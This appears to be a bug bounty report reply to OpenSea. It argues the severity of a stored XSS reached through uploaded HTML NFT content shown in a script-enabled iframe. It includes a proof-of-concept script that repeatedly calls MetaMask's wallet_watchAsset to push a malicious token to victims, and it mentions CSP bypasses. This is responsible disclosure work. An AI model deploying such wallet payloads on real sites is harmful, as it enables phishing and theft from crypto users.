Hello! @coryhardman 

We can see that the hosted NFT content was moved from - `https://storage.opensea.io/` to `https://openseauserdata.com/`

**7 and 8 and 9 explanation video in action:**

{}

The issue here as well is that the embedded iframe on the NFT visit page has **allowed iframe sandbox attribute**: `allow-scripts`

We really recommend to remove this currently allowed sandbox attribute to prevent any potential similar issues in the future.

Example of HTML embedded iframe on `https://opensea.io/assets/ID/ID` NFT view / buy pages.

HTML Code of such iframe:

```
<iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" frameborder="0" height="100%" sandbox="allow-scripts" src="https://opensea.io/assets/0x495f947276749ce646f68ac8c248420045cb7b5e/9787988760406281198527548103924204736443490099038927457432311309863628046337" width="100%" style="min-height: 500px;"></iframe>
```

As said, the ability to upload the `.html` file gives an attacker ability to to design page inside the iframe, an attacker can host anything inside it, to design "fake" visual page that look like they are legitimate from opensea web app, the fact that this was executed from `storage.opensea.io` and when viewed from `opensea.io` website gives the trust to the unsuspecting victim.

An attacker is able to load malicious web3 scripts from external url and interact with web3 wallet api, for example this script blow to add malicious token: (as shown in video above).

This script, or similar one would be hosted inside `storage.opensea.io`:

async function addTokenFunction() {

  try {

    const wasAdded = await ethereum.request({
      method: 'wallet_watchAsset',
      params: {
        type: 'ERC20',
        options: {
          address: tokenAddress,
          symbol: tokenSymbol,
          decimals: tokenDecimals,
          image: tokenImage } } });




    if (wasAdded) {
      console.log('POC!');
    } else {
      console.log('opensea_xss coin has not been added');
    }
  } catch (error) {
    console.log(error);
  }
}
</script>
<script>setInterval(function () {addTokenFunction()}, 5000);</script>

```

web3 api calls: https://metamask.github.io/test-dapp/

web3 docs: https://docs.metamask.io/guide/ethereum-provider.html

For the video Proof of Concept video attached here, we have disabled Browser-level CSP to show what a zero-user interaction CSP Bypass would look like in a true real-world attack.

However, with our reported Chromium-based CSP Bypass we were able to do this as well, but it will require user-interaction. As said - in real-world, an attacker would obviously want to use zero-interaction CSP bypass.

Giving any ability to anyone to write any RAW HTML into trusted domains, especially on web3 applications, is extremely dangerous.

Regarding what you mentioned that interacting with web3 wallets from iframed content should not work, is actually not true, metamask and other wallets do support this.

You can simply check this on multiple projects, such as Uniswap; the list goes on.

Here is an example:

```
<iframe src="https://app.uniswap.org/#/swap?chain=mainnet" width=800 height=800>
```

Uniswap even has documentation about this: https://docs.uniswap.org/protocol/V2/guides/interface-integration/iframe-integration

They use normal web3 javascript file which attacker would load from embedded `storage.opensea.io` - https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.0/web3.min.js or any else web3 javascript alternative out there to create his malicious dapp to host inside iframe.

Video:

{}

As you can see in this video, we are even on completely different origin(`UGWST.COM`): `https://UGWST.COM/pocs/example-iframe.html` (we prepared this, so you can visit and test this yourself) and iframed content from `https://app.uniswap.org/#/swap?chain=mainnet` - the metamask wallet pops from origin `app.uniswap.org`.

Applying this to this report, any web3 metamask/brave/coinbase wallet would be able to interact on `opensea.io` or `testnets.opensea.io` NFT buy/check page from embedded `storage.opensea.io` proving the vulnerability would work from iframe, not only directly when visited on `storage.opensea.io`.

Report summary - what was bypassed and possible:

```
File Upload checks,

opensea.io Web Application WAF (Cloudflare) to host payloads,

True Chromium Based CSP Bypass to prove the XSS vulnerability,

Affected multiple in-scope domains,

Had ability to interact with WEB3 user wallets even from embedded iframe.

Required quite a big fix to move hosted NFT content to non-trusted domain,

Was hosted on NFT Buy / View NFT Page,

Had ability to be created without ANY mint fee
```

Additionally, as said in previous opensea report with id: #1456149, we have not included CSP Bypass and have gotten paid critical severity, for the reported vulnerability.

However, we still wanted you to see the true impact, that even if there are STRICT CSP rules set, that it won't matter, which we provided in this report, we believed you will understand the impact instantly.

We have spent a lot of time just trying to find the Chromium CSP Bypass for you to see the REAL impact. We wanted this report to be forwarded to you ASAP, just like: #1456149, because we believe this issue had a way bigger impact than previously mentioned previous report.

We really do believe this report was not understood correctly; we really do value @opensea dev team time and your time Cory @coryhardman to re-evaluate this report.

Additionally, Cory @coryhardman, since you mentioned what other companies do differently good example is @Google VRP Bug Bounty, they don't require any CSP Bypasses because they are aware that once attacker is able to write RAW HTML into *.google.com scope of domains it's game over.

For them, PoC for Internet Explorer 11 is enough to prove XSS execution as that browser does not have any CSP rules; we were able to do zero-interaction XSS as well via Internet Explorer 11 in this reported vulnerability, but did not include it as the browser is outdated and the opensea.io interface does not really work on Internet Explorer 11; however the XSS still executed without ANY user-interaction.

Our team https://ugwst.com recently started focusing on finding vulnerabilities across multiple crypto projects. Recently we got published critical report, Lido team released a blog post:

https://blog.lido.fi/lido-ui-potential-malicious-code-injection-bug-bounty-report/

In their case, we exploited XSS, chained with Firefox browser-based CSP Bypass; we got paid two bounties for critical severities.

We have a lot of experiences with multiple teams such as Reddit, you can check on my hackerone profile, I am currently rank 1 in Reddit program, and have multiple security blog posts with their security team on reddit.com and https://www.hackerone.com/blog/reddits-public-bug-bounty-program-kicks-qa-reddits-allison-miller-and-spencer-koch-and-top

Our team also holds multiple CVE's in @Apple Security program, @IBM and @Microsoft / @ESET Security - https://ugwst.com/acknowledgements.html

Sharing these so you can see we have got a lot of experience; we believe this vulnerability report was truly misunderstood. We agree we should have explained the vulnerability report in way more detail, since the @opensea bug bounty program is newly listed on this platform.

Hopefully everything is clear; we want to be transparent as much as possible.

Thank you!
